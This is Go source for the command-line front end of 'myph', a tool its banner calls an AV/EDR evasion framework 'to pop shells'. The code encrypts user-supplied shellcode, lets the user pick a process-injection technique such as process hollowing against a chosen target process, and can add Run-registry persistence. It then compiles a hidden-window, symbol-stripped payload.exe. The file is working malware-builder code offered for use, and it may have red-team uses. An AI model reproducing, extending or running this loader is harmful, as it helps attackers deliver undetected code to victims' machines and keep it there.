package cli

import (
	"fmt"
	"os"
	"os/exec"

	"github.com/cmepw/myph/loaders"
	"github.com/cmepw/myph/tools"
	"github.com/spf13/cobra"
)

const MYPH_TMP_DIR = "/tmp/myph-out"
const MYPH_TMP_WITH_PAYLOAD = "/tmp/myph-out/payload.exe"

const ASCII_ART = `
              ...                                        -==[ M Y P H ]==-
             ;::::;
           ;::::; :;                                    In loving memory of
         ;:::::'   :;                               Wassyl Iaroslavovytch Slipak
        ;:::::;     ;.
       ,:::::'       ;           OOO                       (1974 - 2016)
       ::::::;       ;          OOOOO
       ;:::::;       ;         OOOOOOOO
      ,;::::::;     ;'         / OOOOOOO
    ;::::::::: . ,,,;.        /  / DOOOOOO
  .';:::::::::::::::::;,     /  /     DOOOO
 ,::::::;::::::;;;;::::;,   /  /        DOOO        AV / EDR evasion framework
; :::::: '::::::;;;::::: ,#/  /          DOOO           to pop shells and
: ::::::: ;::::::;;::: ;::#  /            DOOO        make the blue team cry
:: ::::::: ;:::::::: ;::::# /              DOO
 : ::::::: ;:::::: ;::::::#/               DOO
 ::: ::::::: ;; ;:::::::::##                OO       written with <3 by djnn
 :::: ::::::: ;::::::::;:::#                OO                ------
 ::::: ::::::::::::;' :;::#                O             https://djnn.sh
   ::::: ::::::::;  /  /  :#
   :::::: :::::;   /  /    #


    `

func GetParser(opts *Options) *cobra.Command {

	version := "1.1.0"
	var cmd = &cobra.Command{
		Use:                "myph",
		Version:            version,
		DisableSuggestions: true,
		Short:              "AV/EDR evasion framework",
		Long:               ASCII_ART,
		Run: func(cmd *cobra.Command, args []string) {

			/* obligatory skid ascii art */
			fmt.Printf("%s\n\n", ASCII_ART)

			/* later, we will call "go build" on a golang project, so we need to set up the project tree */
			err := tools.CreateTmpProjectRoot(MYPH_TMP_DIR, opts.Persistence)
			if err != nil {
				fmt.Printf("[!] Error generating project root: %s\n", err)
				os.Exit(1)
			}

			/* reading the shellcode as a series of bytes */
			shellcode, err := tools.ReadFile(opts.ShellcodePath)
			if err != nil {
				fmt.Printf("[!] Error reading shellcode file: %s\n", err.Error())
				os.Exit(1)
			}

			/* i got 99 problems but generating a random key aint one */
			if opts.Key == "" {
				opts.Key = tools.RandomString(32)
			}

			fmt.Printf("[+] Selected algorithm: %s (Key: %s)\n", opts.Encryption.String(), opts.Key)

			/* encoding defines the way the series of bytes will be written into the template */
			encType := tools.SelectRandomEncodingType()

			fmt.Printf("\tEncoding into template with [%s]\n", encType.String())

			/*
			   depending on encryption type, we do the following:

			   - encrypt shellcode with key
			   - write both encrypted & key to file
			   - write to encrypt.go
			   - write to go.mod the required dependencies
			*/

			var encrypted = []byte{}
			var template = ""

			switch opts.Encryption {
			case EncKindAES:
				encrypted, err = tools.EncryptAES(shellcode, []byte(opts.Key))
				if err != nil {
					fmt.Println("[!] Could not encrypt with AES")
					panic(err)
				}
				template = tools.GetAESTemplate()

			case EncKindXOR:
				encrypted, err = tools.EncryptXOR(shellcode, []byte(opts.Key))
				if err != nil {
					fmt.Println("[!] Could not encrypt with XOR")
					panic(err)
				}
				template = tools.GetXORTemplate()

			case EncKindC20:
				encrypted, err = tools.EncryptChacha20(shellcode, []byte(opts.Key))
				if err != nil {
					fmt.Println("[!] Could not encrypt with ChaCha20")
					panic(err)
				}

				fmt.Println("\n...downloading necessary library...")
				fmt.Println("if it fails because of your internet connection, please consider using XOR or AES instead")

				/* Running `go get "golang.org/x/crypto/chacha20poly1305"` in MYPH_TMP_DIR` */
				execCmd := exec.Command("go", "get", "golang.org/x/crypto/chacha20poly1305")
				execCmd.Dir = MYPH_TMP_DIR

				_, _ = execCmd.Output()
				template = tools.GetChacha20Template()

			case EncKindBLF:
				encrypted, err = tools.EncryptBlowfish(shellcode, []byte(opts.Key))
				if err != nil {
					fmt.Println("[!] Could not encrypt with Blowfish")
					panic(err)
				}

				fmt.Println("\n...downloading necessary library...")
				fmt.Println("if it fails because of your internet connection, please consider using XOR or AES instead")

				/* Running `go get golang.org/x/crypto/blowfish in MYPH_TMP_DIR` */
				execCmd := exec.Command("go", "get", "golang.org/x/crypto/blowfish")
				execCmd.Dir = MYPH_TMP_DIR

				_, _ = execCmd.Output()
				template = tools.GetBlowfishTemplate()
			}

			/* write decryption routine template */
			err = tools.WriteToFile(MYPH_TMP_DIR, "encrypt.go", template)
			if err != nil {
				panic(err)
			}

			persistData := ""
			if opts.Persistence != "" {
				persistData = fmt.Sprintf(`persistExecute("%s")`, opts.Persistence)
				execCmd := exec.Command("go", "get", "golang.org/x/sys/windows/registry")
				execCmd.Dir = MYPH_TMP_DIR
				_, _ = execCmd.Output()

				template = tools.GetPersistTemplate()
				err = tools.WriteToFile(MYPH_TMP_DIR, "persist.go", template)
				if err != nil {
					panic(err)
				}
				fmt.Printf("\nUsing persistence technique, file will be installed to %%APPDATA%%\\%s\n", opts.Persistence)
			}

			/* write main execution template */
			encodedShellcode := tools.EncodeForInterpolation(encType, encrypted)
			encodedKey := tools.EncodeForInterpolation(encType, []byte(opts.Key))
			err = tools.WriteToFile(
				MYPH_TMP_DIR,
				"main.go",
				tools.GetMainTemplate(
					encType.String(),
					encodedKey,
					encodedShellcode,
					opts.SleepTime,
					persistData,
				),
			)
			if err != nil {
				panic(err)
			}

			os.Setenv("GOOS", opts.OS)
			os.Setenv("GOARCH", opts.Arch)

			templateFunc := loaders.SelectTemplate(opts.Technique)
			if templateFunc == nil {
				fmt.Printf("[!] Could not find a technique for this method: %s\n", opts.Technique)
				os.Exit(1)
			}

			err = tools.WriteToFile(MYPH_TMP_DIR, "exec.go", templateFunc(opts.Target))
			if err != nil {
				panic(err)
			}

			fmt.Printf("\n[+] Template (%s) written to tmp directory. Compiling...\n", opts.Technique)
			execCmd := exec.Command("go", "build", "-ldflags", "-s -w -H=windowsgui", "-o", "payload.exe", ".")
			execCmd.Dir = MYPH_TMP_DIR

			_, stderr := execCmd.Output()

			if stderr != nil {
				fmt.Printf("[!] error compiling shellcode: %s\n", stderr.Error())
				fmt.Printf(
					"\nYou may try to run the following command in %s to find out what happend:\n\n GOOS=%s GOARCH=%s %s\n\n",
					MYPH_TMP_DIR,
					opts.OS,
					opts.Arch,
					"go build -ldflags \"-s -w -H=windowsgui\" -o payload.exe",
				)

				fmt.Println("If you want to submit a bug report, please add the output from this command...Thank you <3")
				os.Exit(1)
			}

			tools.MoveFile(MYPH_TMP_WITH_PAYLOAD, opts.OutName)
			os.RemoveAll(MYPH_TMP_DIR)

			fmt.Printf("[+] Done! Compiled payload: %s\n", opts.OutName)
		},
	}

	defaults := GetDefaultCLIOptions()

	cmd.PersistentFlags().StringVarP(&opts.OutName, "out", "f", defaults.OutName, "output name")
	cmd.PersistentFlags().StringVarP(&opts.ShellcodePath, "shellcode", "s", defaults.ShellcodePath, "shellcode path")
	cmd.PersistentFlags().StringVarP(&opts.Target, "process", "p", defaults.Target, "target process to inject shellcode to")
	cmd.PersistentFlags().StringVarP(&opts.Technique, "technique", "t", defaults.Technique, "shellcode-loading technique (allowed: CRT, ProcessHollowing, CreateThread, Syscall)")

	cmd.PersistentFlags().VarP(&opts.Encryption, "encryption", "e", "encryption method. (allowed: AES, chacha20, XOR, blowfish)")
	cmd.PersistentFlags().StringVarP(&opts.Key, "key", "k", "", "encryption key, auto-generated if empty. (if used by --encryption)")

	cmd.PersistentFlags().UintVarP(&opts.SleepTime, "sleep-time", "", defaults.SleepTime, "sleep time in seconds before executing loader (default: 0)")

	cmd.PersistentFlags().StringVarP(&opts.Persistence, "persistence", "z", defaults.Persistence, "name of the binary being placed in '%APPDATA%' and in 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' reg key (default: \"\")")

	return cmd
}
